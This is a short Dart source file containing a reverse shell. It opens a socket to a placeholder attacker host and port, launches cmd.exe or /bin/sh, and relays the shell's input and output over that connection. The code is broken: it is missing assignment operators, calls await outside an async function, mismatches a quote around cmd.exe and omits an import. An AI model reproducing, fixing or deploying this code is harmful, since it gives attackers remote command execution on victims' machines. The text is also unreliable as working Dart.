import 'dart:io';

void main() {

    final socket await Socket.connect('attacker_ip', attacker_port);
    
    final shell Platform.isWindows? cmd.exe': '/bin/sh';

    Process.start(shell, []).then((Process process) {

        process.stdout.transform(utf8.decoder).listen((data) => socket.write(data));

        socket.transform(utf8.decoder).listen((data) => process.stdin.write(data));

});

}